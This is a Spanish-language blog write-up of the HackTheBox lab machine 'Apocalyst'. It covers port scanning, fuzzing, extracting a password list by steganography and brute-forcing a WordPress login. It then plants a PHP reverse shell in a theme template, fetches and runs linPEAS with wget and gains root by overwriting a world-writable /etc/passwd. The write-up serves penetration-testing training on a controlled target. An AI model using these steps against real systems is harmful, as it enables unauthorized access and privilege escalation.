<!DOCTYPE html> <!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--> <!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"><!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"> <title>Apocalyst Writeup HackTheBox &#8211; Th4Nuno</title> <meta name="description" content="Moon is a minimal, one column jekyll theme for your blog."> <meta name="keywords" content="fuzzing, pentesting, web, cryptography, privesc"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:image" content="https://th4nuno.github.io/assets/img/posts/apocalyst.png"> <meta name="twitter:title" content="Apocalyst Writeup HackTheBox"> <meta name="twitter:description" content="Les traigo el writeup de una máquina de tipo CTF, la cuál tiene una intrusión bastante única y siendo de dificultad media es bastante accesible para los que están empezando en el mundo del pentesting"> <meta name="twitter:site" content="@BrunoCS_32"> <meta name="twitter:creator" content="@BrunoCS_32"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="Apocalyst Writeup HackTheBox"> <meta property="og:description" content="Les traigo el writeup de una máquina de tipo CTF, la cuál tiene una intrusión bastante única y siendo de dificultad media es bastante accesible para los que están empezando en el mundo del pentesting"> <meta property="og:url" content="https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox/"> <meta property="og:site_name" content="Th4Nuno"> <meta property="og:image" content="https://th4nuno.github.io/assets/img/logo.png"> <link rel="canonical" href="https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox/"> <link href="https://th4nuno.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="Th4Nuno Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="https://th4nuno.github.io/assets/css/main.css"> <!-- JS --> <script src="https://th4nuno.github.io/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="https://th4nuno.github.io/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="https://th4nuno.github.io/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="https://th4nuno.github.io/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="https://th4nuno.github.io/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="https://th4nuno.github.io/favicon.png" /> <link rel="shortcut icon" href="https://th4nuno.github.io/favicon.ico" /> <!-- Background Image --> <style type="text/css">body {background-image:url(https://th4nuno.github.io/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> <style type="text/css">.feature {background-image:url(https://th4nuno.github.io/assets/img/posts/apocalyst.png);}</style> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="https://th4nuno.github.io/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="https://th4nuno.github.io/assets/img/logo.png" alt="Th4Nuno photo" class="author-photo"> <h4>Th4Nuno</h4> <p>Moon is a minimal, one column jekyll theme for your blog.</p> </li> <li><a href="https://th4nuno.github.io/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://twitter.com/BrunoCS_32" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://github.com/th4nuno" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul><!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="https://th4nuno.github.io/posts/">All Posts</a></li> <li><a href="https://th4nuno.github.io/tags/">All Tags</a></li> </ul> </li> <li><a href="https://th4nuno.github.io/projects/" >Projects</a></li> </ul><!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title feature "> <h1>Apocalyst Writeup HackTheBox</h1> <h4>22 Feb 2022</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~9 minutes </p><!-- /.entry-reading-time --> <a class="btn zoombtn" href="https://th4nuno.github.io/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <h1 id="reconocimiento">Reconocimiento</h1> <p>Comenzamos con esta etapa usando una herramienta de escaneo de puertos muy conocida llamada <em>nmap</em>. Primero haremos un escaneo simple para encontrar los puertos abiertos y luego buscaremos más detalle en los encontrados.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap -p- --open -v -T5 -sS -n -Pn 10.10.10.46 -oG allPorts</code></pre></figure> <p>Para realizar un escaneo del rango completo de puertos por TCP (0-65535) y mostrar solamente los abiertos usamos los parámetros <em>-p-</em> y <em>–open</em>. También agregamos <em>-v</em> para irnos mostrando la información que nmap encuentre. Ahora, este escaneo puede llevar mucho tiempo. Para más rapidez, como estamos en un ambiente controlado en el que podemos hacer pruebas sin ningun tipo de problema, vamos a utilizar el nivel mas rápido que trae esta herramienta, especificando el parámetro <em>-T5</em>, además de simplicar el escaneo con un SYN scan (<em>-sS</em>), sin resolución DNS (<em>-n</em>) y sin host discovery (<em>-Pn</em>). Tambien lo voy a exportar en formato grepeable para obtener los puertos de una forma rápida con <a href="https://pastebin.com/tYpwpauW">extractPorts</a>, una función en bash que tengo añadida a mi terminal.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-22 11:56 -03
Initiating SYN Stealth Scan at 11:56
Scanning 10.10.10.46 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.10.46
Discovered open port 22/tcp on 10.10.10.46
SYN Stealth Scan Timing: About 37.29% <span class="k">done</span>; ETC: 11:57 <span class="o">(</span>0:00:52 remaining<span class="o">)</span>
Completed SYN Stealth Scan at 11:57, 73.13s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.46
Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>73.24 seconds
           Raw packets sent: 69344 <span class="o">(</span>3.051MB<span class="o">)</span> | Rcvd: 69344 <span class="o">(</span>2.774MB<span class="o">)</span></code></pre></figure> <p>Nmap nos muestra que los únicos puertos que están abiertos son el 22 (SSH) y el 80 (HTTP). Ahora vamos a tomar estos puertos y realizar un escaneo para intentar obtener sus versiones y enumerar los servicios con los scripts de nmap (<em>-sCV</em>)</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap -sCV -p 22,80 10.10.10.46 -oN targeted</code></pre></figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-22 13:36 -03
Nmap scan report <span class="k">for </span>10.10.10.46
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux; protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 <span class="o">(</span>RSA<span class="o">)</span>
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: WordPress 4.8
|_http-title: Apocalypse Preparation Blog
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.08 seconds</code></pre></figure> <h3 id="wordpress">Wordpress</h3> <p>Ahora que tenemos mas información, sabemos especificamente sus versiones y además, con el script de nmap <em>http-generator</em> vemos que el sitio web tiene de CMS un Wordpress. Esto lo podemos confirmar con whatweb:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">whatweb 10.10.10.46</code></pre></figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">http://10.10.10.46 <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.46], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Apocalypse Preparation Blog], UncommonHeaders[link], WordPress[4.8]</code></pre></figure> <p>Como es un Wordpress usando <strong>wpscan</strong>, que es una herramienta que podés encontrar <a href="https://github.com/wpscanteam/wpscan">acá</a>, podemos escanear el sitio web en busca de algun fallo del que nos podramos aprovechar. En este caso no es de utilidad, asi que seguimos buscando.</p> <p>Si miramos la página web a través de la ip se ve bastante mal. Esto lo podemos solucionar agregando el dominio, colocando la siguiente línea en nuestro <em>/etc/hosts</em>:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">10.10.10.46 apocalyst.htb</code></pre></figure> <p>Utilizando el script <em>http-enum</em> de nmap podemos hacer fuzzing con un diccionario muy simple que trae la misma, el cual nos arroja algunos resultados:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap --script<span class="o">=</span>http-enum -p 80 10.10.10.46 -oN webScan</code></pre></figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">Nmap scan report <span class="k">for </span>10.10.10.46
  Host is up <span class="o">(</span>0.15s latency<span class="o">)</span>.
  
  PORT   STATE SERVICE
  80/tcp open  http
  | http-enum:
  |   /blog/: Blog
  |   /wp-login.php: Possible admin folder
  |   /readme.html: Wordpress version: 2
  |   /: WordPress version: 4.8
  |   /wp-includes/images/rss.png: Wordpress version 2.2 found.
  |   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
  |   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
  |   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
  |   /wp-login.php: Wordpress login page.
  |   /wp-admin/upgrade.php: Wordpress login page.
  |   /readme.html: Interesting, a readme.
  |   /custom/: Potentially interesting folder
  |   /down/: Potentially interesting folder
  |   /good/: Potentially interesting folder
  |   /hidden/: Potentially interesting folder
  |   /idea/: Potentially interesting folder
  |   /info/: Potentially interesting folder
  |   /information/: Potentially interesting folder
  |   /name/: Potentially interesting folder
  |   /page/: Potentially interesting folder
  |   /personal/: Potentially interesting folder
  |   /pictures/: Potentially interesting folder
  |   /site/: Potentially interesting folder
  |  /state/: Potentially interesting folder
  
  <span class="c"># Nmap done at Wed Feb 23 09:19:46 2022 -- 1 IP address (1 host up) scanned in 15.31 seconds</span></code></pre></figure> <p>Sin contar las páginas de Wordpress por defecto, la mayoría nos resuelven el mismo resultado: una simple imagen.</p> <p><img src="https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst1.png" alt="apocalyst1" /></p> <p>Esto ya parece un poco raro, vamos a seguir viendo a ver que encontramos.</p> <h3 id="fuzzing">Fuzzing</h3> <p>Haciendo fuzzing con la herramienta WFuzz (si no la conocés tengo un articulo <a href="https://th4nuno.github.io/Aprende-a-Usar-Wfuzz">acá</a> en el que te enseño cómo utilizarla) encontramos el mismo resultado reiteradas veces, la misma imagen con la misma cantidad de carácteres, lo que significa que son idénticas. Como la página web es un blog con varios artículos, vamos a hacer uso de Cewl (que viene instalada por defecto en Parrot y Kali Linux), la cuál nos permitirá crear nuestro propio diccionario en base a la url que especifiquemos:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">cewl -w wordlist.txt <span class="s2">"http://apocalyst.htb/"</span></code></pre></figure> <p>Con este comando ya habríamos creado el archivo <em>wordlist.txt</em> así que vamos a incorporarlo a WFuzz, ocultando los resultados que nos arrojen 157 carácteres que devuelven la imagen repetida:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">wfuzz -c --hc<span class="o">=</span>404 --hh<span class="o">=</span>157 -t 200 -L -u <span class="s2">"http://apocalyst.htb/FUZZ"</span> -w ../content/wordlist.txt</code></pre></figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://apocalyst.htb/FUZZ
Total requests: 532

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
<span class="o">=====================================================================</span>

000000455:   200        14 L     20 W       175 Ch      <span class="s2">"Rightiousness"</span>                                                                                                             

Total <span class="nb">time</span>: 0
Processed Requests: 532
Filtered Requests: 531
Requests/sec.: 0</code></pre></figure> <p>Como ven encontramos solo una página, pero lo que más nos llama la atención es que nos muestra la misma imagen que vimos anteriormente, pero con una cantidad de carácteres diferente. Esto significa que seguramente estamos ante una técnica de <strong>esteganografía</strong>.</p> <h2 id="esteganografía-en-imágenes">Esteganografía en Imágenes</h2> <p>Esta técnica de criptografía muy conocida nos permite ocultar información dentro de una imagen, pero sin que se vea a simple vista. Esto es lo que nos está pasando seguramente. Todas las imágenes son iguales menos una, que tiene un tamaño diferente (por eso nos devuelve otra cantidad diferente de carácteres). Para analizarla y comprobar si hay un archivo oculto dentro, vamos a utilizar un herramienta llamada <strong>steghide</strong>. Descargamos la imagen y utilizamos el siguiente comando.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">steghide info image.jpg</code></pre></figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="s2">"image.jpg"</span>:
  format: jpeg
  capacity: 13.0 KB
Try to get information about embedded data ? <span class="o">(</span>y/n<span class="o">)</span> y
Enter passphrase: 
  embedded file <span class="s2">"list.txt"</span>:
    size: 3.6 KB
    encrypted: rijndael-128, cbc
    compressed: yes</code></pre></figure> <p>Al ejecutarlo nos pide una contraseña, pero si probamos dejándolo en blanco funciona. Nos muestra que hay un archivo list.txt contenido dentro de la imagen, el cual podemos extraer:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">steghide extract -sf image.jpg</code></pre></figure> <p>El archivo que obtenemos no es más que una simple lista de palabras, pero que podemos utilizar para intentar hacer un bruteforcing.</p> <h3 id="bruteforcing">Bruteforcing</h3> <p>Para esto tenemos que obtener un usuario válido. Esto es muy fácil, ya que si observamos cualquier artículo del sitio web como es un Wordpress nos muestra el usuario que lo creó. Este usuario se llama “falaraki”. Podemos comprobar que es un usuario válido visitando <em>wp-login.php</em>, colocando un usuario erróneo obtenemos:</p> <p><img src="https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst2.png" alt="apocalyst2" /></p> <p>Claramente nos dice que lo que está mal es el usuario. Ahora, vamos a ver qué nos muestra si probamos con falaraki:</p> <p><img src="https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst3.png" alt="apocalyst3" /></p> <p>Ahora nos dice otra cosa diferente. Esto es porque Wordpress por defecto diferencia el error de un usuario inválido al de un usuario válido con una contraseña incorrecta. Por lo tanto, vamos a probar de vuelta con <strong>wpscan</strong> pero ahora realizando un bruteforcing. Para eso vamos a utilizar el siguiente comando, habiendo guardado el usuario dentro de un archivo “user” en el mismo directorio que nuestra lista de contraseñas:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">wpscan --url http://apocalyst.htb/ -U user -P list.txt</code></pre></figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+] Performing password attack on Wp Login against 1 user/s
<span class="o">[</span>SUCCESS] - falaraki / Transclisiation                                                                                                                                                       
Trying falaraki / total Time: 00:00:21 &lt;<span class="o">=============================================</span>                                                                     &gt; <span class="o">(</span>335 / 821<span class="o">)</span> 40.80%  ETA: ??:??:??

<span class="o">[</span>!] Valid Combinations Found:
 | Username: falaraki, Password: Transclisiation</code></pre></figure> <p>Excelente! Conseguimos credenciales válidas, ahora toca la parte mas fácil, que es obtener acceso a la máquina.</p> <h3 id="explotando-el-panel-de-wordpress">Explotando el Panel de Wordpress</h3> <p><img src="https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst4.png" alt="apocalyst4" /></p> <p>Ahora que estamos dentro del panel de Wordpress, vamos a dirigirnos a <em>Appeareance-&gt;Editor</em></p> <p><img src="https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst5.png" alt="apocalyst5" /></p> <p>Dentro del editor, vamos a abrir el template <em>404.php</em> que se encuentra a la derecha. Esto nos permite modificar el código PHP del mismo, por lo tanto simplemente añadimos una reverse shell en PHP y guardamos el archivo. Solo falta ponernos en escucha con <strong>netcat</strong> e irnos a un artículo que no exista. Para ponernos en escucha por el puerto 443 ejecutamos el siguiente comando:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc -nvlp 443</code></pre></figure> <p>Como podemos listar los artículos con <em>?p=x</em> vamos a cambiarlo a un número que no exista, como por ejemplo <em>?p=10</em> y obtenemos inmediatamente la shell.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">www-data@apocalyst:/var/www/html/apocalyst.htb$ </span>whoami
whoami
www-data</code></pre></figure> <h4 id="tratamiento-de-la-tty">Tratamiento de la TTY</h4> <p>La shell que tenemos realmente no es tan cómoda, así que para solucionarlo podemos realizar una serie de pasos que siempre son los mismos en una máquina Linux, para poder obtener una shell completamente funcional.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">script /dev/null -c bash
<span class="o">(</span>Ctrl-Z<span class="o">)</span>
stty raw -echo; <span class="nb">fg
	</span>reset xterm
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash</code></pre></figure> <p>Listo. Ahora podemos hacer Ctrl-C sin peligro de que se nos cierre la bash y Ctrl-L para limpiar la terminal.</p> <p>Si nos dirigimos a /home/falaraki encontramos el user.txt con la flag. Ahora toca escalar privilegios.</p> <h2 id="escalación-de-privilegios">Escalación de Privilegios</h2> <p>Vamos a descargar en la máquina <a href="https://github.com/carlospolop/PEASS-ng"><strong>linPEAS</strong></a>, una utilidad que nos permitirá realizar una gran cantidad de escaneos para encontrar fallas en el sistema. Para traerla decidí crear en mi máquina un servidor en Python en el mismo directorio que tengo el script y descargar el archivo en la shell.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">(</span>En mi máquina<span class="o">)</span>
python3 -m http.server 80

<span class="o">(</span>En la máquina víctima<span class="o">)</span>
<span class="nb">cd</span> /dev/shm
wget http://10.10.14.7/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh</code></pre></figure> <p>Como el escaneo devuelve demasiada información voy a colocar sólo un fragmento que me llamó mucho la atención:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">╔══════════╣ Permissions <span class="k">in </span>init, init.d, systemd, and rc.d   
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
═╣ Writable passwd file? ................ /etc/passwd is writable</code></pre></figure> <p>Esto muy pocas veces lo van a ver, pero cuando lo vean ya tienen asegurado el root. Como tenemos permisos para escribir en el passwd podemos acceder como el usuario que queramos. Lo pueden comprobar haciendo un <em>ls</em>:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">ls -la /etc/passwd
-rw-rw-rw- 1 root root 1649 Feb 24 12:25 /etc/passwd</code></pre></figure> <p>Por defecto los usuarios tienen una x, lo que significa que la contraseña la tomará del /etc/shadow, archivo el cuál no tenemos acceso. Por lo tanto, necesitamos cambiar esa x por un hash, porque el sistema tomará la primera contraseña que encuentre, que será la añadida.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">&gt; </span>openssl passwd
Password: toor
Verifying - Password: toor
2r5/v3qyIr5jI</code></pre></figure> <p>Cambiamos la x de root en el /etc/passwd por este hash y listo:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">www-data@apocalyst:/dev/shm$ </span>su root
Password: 
<span class="gp">root@apocalyst:/dev/shm# </span>whoami 
root
<span class="gp">root@apocalyst:/dev/shm# </span></code></pre></figure> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="https://th4nuno.github.io/tags/#fuzzing" title="Pages tagged fuzzing" class="tag"><span class="term">fuzzing</span></a><a href="https://th4nuno.github.io/tags/#pentesting" title="Pages tagged pentesting" class="tag"><span class="term">pentesting</span></a><a href="https://th4nuno.github.io/tags/#web" title="Pages tagged web" class="tag"><span class="term">web</span></a><a href="https://th4nuno.github.io/tags/#cryptography" title="Pages tagged cryptography" class="tag"><span class="term">cryptography</span></a><a href="https://th4nuno.github.io/tags/#privesc" title="Pages tagged privesc" class="tag"><span class="term">privesc</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Share</span> </a> <a href="https://twitter.com/intent/tweet?text=https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> </header> <!-- JS --> <script src="https://th4nuno.github.io/assets/js/jquery-1.12.0.min.js"></script> <script src="https://th4nuno.github.io/assets/js/jquery.dlmenu.min.js"></script> <script src="https://th4nuno.github.io/assets/js/jquery.goup.min.js"></script> <script src="https://th4nuno.github.io/assets/js/jquery.magnific-popup.min.js"></script> <script src="https://th4nuno.github.io/assets/js/jquery.fitvid.min.js"></script> <script src="https://th4nuno.github.io/assets/js/scripts.js"></script> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
